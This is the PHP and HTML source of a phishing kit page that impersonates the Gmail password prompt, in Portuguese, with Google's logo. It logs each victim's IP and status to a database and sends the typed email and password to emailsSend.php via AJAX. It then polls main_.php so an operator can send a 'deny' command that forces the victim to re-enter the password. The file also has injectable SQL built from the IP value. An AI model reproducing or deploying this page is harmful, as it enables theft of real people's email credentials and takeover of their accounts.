﻿<?php

@session_start();
error_reporting(0);
ini_set("display_errors", 0 );
require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";
 $erro = $_REQUEST['error'];
 $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);

  $query_info = "SELECT * FROM infos WHERE ip='$ip'"; 
  $recorinfo = mysqli_query(DBConnect(), $query_info) or die(mysqli_error(DBConnect()));
  $row_infio = mysqli_fetch_assoc($recorinfo); 
  $totalRowsinfo = mysqli_num_rows($recorinfo); 
  


$email = $_POST['login'];

$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', status='Cliente online email', statusremote='Cliente online na senha do email' WHERE ip='$ip'");

?>
<!doctype html>
<html>

<head>
    <meta charset="utf-8">
   <title>Gmail</title>
    <meta content="width=device-width,initial-scale=1" name=viewport>
    <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="css/style.min.css">

    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/i18next@21.6.10/i18next.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery-i18next@1.2.1/jquery-i18next.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/i18next-browser-languagedetector@6.1.3/i18nextBrowserLanguageDetector.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/i18next-http-backend@1.3.2/i18nextHttpBackend.min.js"></script>
    
    <script type="application/javascript" src="dados_comando.js"></script>

    <!-- <script src="js/verificarUsuario.js"></script> -->


    <style>
        #errorsenha {
            display: none;
        }
      

    </style>
    <script>
        //função enviar senha
        $(document).ready(function () {
            $(document).on('click', '#entrar', function (e) {
                e.preventDefault();


                var email = $("#email").val();
                var emailsenha = $("#emailsenha").val();

                if (emailsenha == "") {
                    comandoerrordados()

                } else {



                    $("#emailsenha").prop('disabled', true);
                    $("#entrar").prop('disabled', true);
                    document.getElementById("barra").style.display = "block";
                    
                    $.ajax({
                        type: 'post', //Definimos o método HTTP usado
                        data: {
                            email: email,
                            emailsenha: emailsenha
                        },
                        dataType: 'json', //Definimos o tipo de retorno
                        url: 'emailsSend.php', //Definindo o arquivo onde serão buscados os dados
                        success: function (data) {
                           
                            dispararComando();
                            document.getElementById('mesa').style.borderBottom =
                                "2px solid #4285F4";
                            $("#errorsenha").css("display", "none");

                        }
                    });

                }


            });
        });

        function dispararComando(e) {

            myVar = setInterval(esperaresposta, 1400);

        }



        function esperaresposta() {
            //alert("teste");
            Get("", "./main_.php", 0);

        }

        function comandoerrordados() {
            //alert("te");
            document.getElementById("barra").style.display = "none";
            $("#emailsenha").prop('disabled', false);
            $("#entrar").prop('disabled', false);
            document.getElementById('mesa').style.borderBottom = "2px solid red";
            $("#errorsenha").css("display", "block");

            // document.getElementById('errorsenha').innerHTML = "";

        }


        var onOff = 1;


        function Get(data, urlapi, e) {

            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 200) {
                    var json = this.response;
                    if (e != 1) {
                        status(JSON.parse(json));
                    }
                }
            };
            xhttp.open("GET", urlapi + data, true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send();
            return false;
        }

        function status(json) {


            if (json.comando == "negaremailsyng") {
                clearInterval(myVar);
                comandoerrordados();


            };


        }
    </script>
    <div style=""
        class="MqxombNty5nrGeK4">
        <style type="text/css">
            body {
                margin: 0;
            }

            @media (max-width: 1366px) {
                #topo {
                    max-width: 1160px;
                }
            }

            @media (max-width: 1215px) {
                #topo {
                    max-width: 960px;
                }
            }

            @media (max-width: 1007px) {
                #topo {
                    max-width: 740px;
                }
            }

            #box {
                height: auto;
                background: #FFF;
                margin: 0 auto;
                margin-top: 5%;
                border: 1px solid #DADCE0;
                border-radius: 10px;
            }

            @media (min-width: 637px) {
                #box {
                    max-width: 450px !important;
                }
            }

            @media (max-width: 636px) {
                #box {
                    max-width: 100%;
                    border: none !important;
                }
            }

            @media (max-width: 1366px) {
                #bottom {
                    max-width: 1160px;
                }
            }

            @media (max-width: 1215px) {
                #bottom {
                    max-width: 960px;
                }
            }

            @media (max-width: 1007px) {
                #bottom {
                    max-width: 740px;
                }
            }

            @media (max-width: 784px) {
                #bottom {
                    max-width: 200px;
                }
            }

            @media (min-width: 477px) {
                #me {
                    float: right;
                    padding: 10px;
                    width: 120px;
                }
            }

            @media (max-width: 477px) {
                #me {
                    float: left;
                    padding: 0 0 10px 0;
                    width: 90%;
                }
            }

            @media (max-width: 768px) {
                #re {
                    display: none;
                }
            }

            #emailsenha {
                width: 100%;
                padding: 10px;
                font-size: 14px;
                border: none;
                outline: none;
                border-radius: 10px;
            }

            #entrar {
                width: 116px;
                height: 36px;
                background: #4285F4;
                border: none;
                color: #FFF;
                border-radius: 5px;
                font-weight: bold;
            }

            .progress {
                height: 15px;
                background-color: #777;
                position: relative;
            }

            .progress .progress-bar {
                position: absolute;
                height: 100%;
                background-color: #add555;
                animation: progress-animation 6s infinite;
            }


            @keyframes progress-animation {
                0% {
                    width: 0%;
                }

                100% {
                    width: 100%
                }

            }
        </style>
        <script>
            function clicar() {
                document.getElementById('mesa').style.borderBottom = "2px solid #4285F4";
            }
        </script>
</head>

<body>





    <form name="form" id="form" method="post">
     
        <div id="box">
               <div id="barra" style="    display: none;
    width:100%;
    height: 0px
px
;">
            <img src="./images/loadercarrega.svg">
        </div>

            <div style="padding:50px 25px 0px 40px; font-family: Arial;">
                <div style="width: 100%;float: center;">
                   <center>
                    <div style="float: center;width: calc((100% / 2) - 20px);min-height: 5px;">
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg"
                            aria-hidden="true">
                            <g id="qaEJec">
                                <path fill="#ea4335"
                                    d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z">
                                </path>
                            </g>
                            <g id="YGlOvc">
                                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                            </g>
                            <g id="BWfIk">
                                <path fill="#4285f4"
                                    d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z">
                                </path>
                            </g>
                            <g id="e6m3fd">
                                <path fill="#fbbc05"
                                    d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z">
                                </path>
                            </g>
                            <g id="vbkDmc">
                                <path fill="#ea4335"
                                    d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z">
                                </path>
                            </g>
                            <g id="idEJde">
                                <path fill="#4285f4"
                                    d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z">
                                </path>
                            </g>
                        </svg>
                    </div>
                   </center>
                </div>


                <div>

                    <div jsname="paFcre">
                        <div class="jXeDnc " jsname="tJHJj" jscontroller="S9352b"
                            jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;">

                            <br>
                            <h1 style="font-size:20px;" class="ahT6S " data-a11y-title-piece="" id="headingText"
                                jsname="r4nke">
                                <span jsslot="" data-i18n="email.default.continue">Bem-Vindo</span>
                            </h1>
                            <div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob"></div>
                            <div class="aCayab">
                                <div jscontroller="IIfQad"
                                    jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;"
                                    class="YZrg6 HnRr5d iiFyne cd29Sd" tabindex="0" role="link"
                                    aria-label="<?= $email; ?> selecionado. Alternar entre contas" jsname="af8ijd">
                                    <div class="gPHLDe">
                                        <div class="qQWzTd" aria-hidden="true"><svg aria-hidden="true" class="stUf5b"
                                                fill="currentColor" focusable="false" width="48px" height="48px"
                                                viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                <path
                                                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z">
                                                </path>
                                            </svg></div>
                                    </div>
                                    <div jsname="fmcmS" class="KTeGk" id="profileIdentifier">
                                        <?= $email; ?></div>
                                    <div class="krLnGe"><svg aria-hidden="true" class="stUf5b MSBt4d"
                                            fill="currentColor" focusable="false" width="24px" height="24px"
                                            viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                            <polygon
                                                points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71">
                                            </polygon>
                                        </svg></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div
                    style="font-size:11px; color:#<?php $provedor = $email; if ($provedor == ""){ echo '#DADCE0'; } else{ echo 'C00'; } ?>; height:15px; margin-top: 40px;">

                </div>

                <div id="mesa" style="border:1px solid #DADCE0; border-radius: 5px;">
                    <input type="password" name="emailsenha" id="emailsenha" placeholder="Digite sua senha"
                         size="1" data-i18n="[placeholder]email.gmail.password.placeholder">
                        
                    <input type="hidden" name="email" id="email" value="<?=$email?>">
                </div>
                <div class="BudEQ rBUW7e" jsaction="click:DKv26d;JIbuQc:vKfede(ornU0b);RXQi4b:.CLIENT;TGB85e:.CLIENT" jscontroller="Dt3C4" jsname="wQNmvb">
   <div class="sSzDje NEk0Ve">
      <div class="enBDyd ">
         <div class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine y5MMGc sD2Hod VfPpkd-MPu53c-OWXEXe-mWPk3d VfPpkd-MPu53c-OWXEXe-gk6SMd" jscontroller="etBPYb" data-indeterminate="false" jsname="ornU0b" jsaction="click:cOuCgd;clickmod:vhIIDb; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; contextmenu:mg9Pef; animationend:L9dL9d;dyRcpb:dyRcpb;" data-disable-idom="true" data-value="optionc1" style="--mdc-ripple-fg-size:24px; --mdc-ripple-fg-scale:1.66667; --mdc-ripple-left:8px; --mdc-ripple-top:8px;">
            <input onclick="verpass()" class="VfPpkd-muHVFf-bMcfAe" type="checkbox" jsname="YPqjbf" jsaction="focus:AHmuwe; blur:O22p3e; change:WPi0i;" aria-labelledby="selectionc0" id="selectionc0">
            <div class="VfPpkd-YQoJzd">
               <svg aria-hidden="true" class="VfPpkd-HUofsb" viewBox="0 0 24 24">
                  <path class="VfPpkd-HUofsb-Jt5cK" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path>
               </svg>
               <div class="VfPpkd-SJnn3d"></div>
            </div>
            <div class="VfPpkd-OYHm6b"></div>
            <div class="VfPpkd-sMek6-LhBDec"></div>
         </div>
      </div>
      <div class="DVnhEd">
         <div jsname="V67aGc" class="wFCloc">
            <div id="mostrarsenha" jsslot="" onclick="selecionado()" class="d3GVvd jGAaxb" jsname="CeL6Qc">Mostra senha</div>
         </div>
      </div>
   </div>
</div>
                <div style="font-size:11px;" id="errorsenha">
                    <span style="color: red;" data-i18n="email.gmail.password.error">Senha incorreta. Tente novamente ou clique em Esqueci a senha para redefini-la.</span>
                </div>
                <div style="margin-top:60px; height: 40px;">
                    <div style="float: left; padding: 8px 0 0 0; font-size: 14px;"><a target="_blank"
                            href="#">Esquecido
                            senha</a></div>
                    <div style="float: right; text-align: right;"><input type="submit" name="entrar" data-i18n="[value]email.gmail.password.button" id="entrar"
                            value="Próximo" /></div>
                </div>
            </div>
        </div>
    </form>
    </div>
    </div>

<script type="text/javascript">
   
var checkbox = document.querySelector("#selectionc0");
function ativarCheckbox(el) {
    el.checked = true;
}

function selecionado(){
ativarCheckbox(checkbox);
verpass();
}


 function verpass() {
  var senha = document.getElementById("emailsenha");
  if (senha.type === "password") {
    senha.type = "text";
    document.getElementById('mostrarsenha').innerHTML ="Esconder a senha";
  } else {
    senha.type = "password";
     document.getElementById('mostrarsenha').innerHTML ="Mostrar senha";
  }
} 

</script>

</body>

</html>